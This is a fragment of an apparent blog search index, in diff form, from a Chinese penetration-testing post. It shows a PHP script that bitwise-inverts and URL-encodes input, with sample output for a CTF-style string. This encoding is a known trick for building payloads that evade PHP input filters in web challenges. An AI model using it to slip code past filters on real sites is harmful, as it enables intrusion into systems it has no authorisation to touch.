+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;your input: &#x27;</span>);</span><br><span class="line"><span class="variable">$input</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*]&#x27;</span>.<span class="string">&#x27;~&#x27;</span>.urlencode(~<span class="variable">$input</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">your input: guetctf</span><br><span class="line">[*]~%98%8A%9A%8B%9C%8B%99</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
       </tags>
   </entry>
 </search>
